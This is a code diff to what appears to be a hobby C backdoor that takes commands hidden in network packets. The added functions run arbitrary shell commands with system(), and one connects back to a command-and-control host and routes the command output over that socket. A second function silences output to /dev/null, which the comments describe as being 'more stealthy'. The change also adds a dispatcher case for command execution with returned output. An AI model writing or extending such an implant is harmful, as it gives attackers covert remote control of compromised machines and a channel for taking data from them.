@@ -7,6 +7,7 @@ more about C networking and packets on raw sockets and whatnot
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
+#include <fcntl.h>
 #include <arpa/inet.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
@@ -42,11 +43,136 @@ int send_ping(int destination_address) {
     return 0;
 }
 
-// Just uses system to execute a command
-void execute_command(char* payload) {
+// Uses system to execute a command. Send result of command to C2
+int execute_command(char* payload, int destination_address) {
+
+    // Set up socket
+    struct sockaddr_in addr;
+    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+
+    addr.sin_family = AF_INET; 
+    addr.sin_port = htons(C2_PORT);
+
+    addr.sin_addr.s_addr = destination_address; 
+
+    // Connect to the C2
+    if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        perror("Could not connect to C2");
+        return 1;
+    }
+
+    // Save original standard out
+    int saved_stdout = dup(STDOUT_FILENO);
+    if (saved_stdout == -1) {
+        perror("dup error");
+        return 1;
+    }
+
+    // Save original standard error
+    int saved_stderr = dup(STDERR_FILENO);
+    if (saved_stderr == -1) {
+        perror("dup error");
+        return 1;
+    }
+
+    // Redirect standard out to the socket_fd
+    if (dup2(socket_fd, STDOUT_FILENO) == -1) {
+        perror("dup2 Error");
+        return 1;
+    }
+
+    // Redirect standard error to the socket_fd
+    if (dup2(socket_fd, STDERR_FILENO) == -1) {
+        perror("dup2 Error");
+        return 1;
+    }
+
+    // Execute command
+    int ret = system(payload);
+
+    // Force flush before restoring
+    fflush(stdout);
+    fsync(STDOUT_FILENO);  // belt-and-suspenders for socket fds
+
+    // Restore the og standard out fd
+    if (dup2(saved_stdout, STDOUT_FILENO) == -1) {
+        perror("dup2 restore error");
+        return 1;
+    }
+
+    // Restore the og standard error fd
+    if (dup2(saved_stderr, STDERR_FILENO) == -1) {
+        perror("dup2 restore error");
+        return 1;
+    }
+
+    // Close the saved stdout fd
+    close(saved_stdout);
+
+    // Close the saved stderr fd
+    close(saved_stderr);
+
+    // Close the socket fd
+    close(socket_fd);
+
+}
+
+// Just uses system to execute a command. Blind, so doesn't send result
+// Redirect standard out and standard error to /dev/null to be more stealthy
+int blind_execute_command(char* payload) {
+
+    // Save original standard out
+    int saved_stdout = dup(STDOUT_FILENO);
+    if (saved_stdout == -1) {
+        perror("dup error");
+        return 1;
+    }
+
+    // Save original standard error
+    int saved_stderr = dup(STDERR_FILENO);
+    if (saved_stderr == -1) {
+        perror("dup error");
+        return 1;
+    }
+
+    // Make fd to /dev/null
+    int dev_null = open("/dev/null", O_WRONLY);
+    
+    // Redirect standard out to /dev/null
+    if(dup2(dev_null, STDOUT_FILENO) == -1) {
+        perror("dup2 Error");
+        return 1; 
+    }
+
+    // Redirect standard error to /dev/null
+    if(dup2(dev_null, STDERR_FILENO) == -1) {
+        perror("dup2 Error");
+        return 1; 
+    }
 
     // Use system. Could use execve but system would allow for more shell like command execution
     int ret = system(payload);
+
+    // Restore the og standard out fd
+    if (dup2(saved_stdout, STDOUT_FILENO) == -1) {
+        perror("dup2 restore error");
+        return 1;
+    }
+
+    // Restore the og standard error fd
+    if (dup2(saved_stderr, STDERR_FILENO) == -1) {
+        perror("dup2 restore error");
+        return 1;
+    }
+
+    // Close /dev/null
+    close(dev_null);
+
+    // Close the saved stdout fd
+    close(saved_stdout);
+
+    // Close the saved stderr fd
+    close(saved_stderr);
 }
 
 // Parse payload. Look for our established protocol message
@@ -94,7 +220,13 @@ int parse_payload(char* payload, int payload_len, int source_address) {
         // Handle command execution (with no output returned)
         case CMD_EXEC_BLIND:
             printf("Handling exec blind\n");
-            execute_command(command);
+            blind_execute_command(command);
+            break;
+
+        // Handle command execution (WITH output returned)
+        case CMD_EXEC:
+            //printf("Handling exec");
+            execute_command(command, source_address);
             break;
     }
     
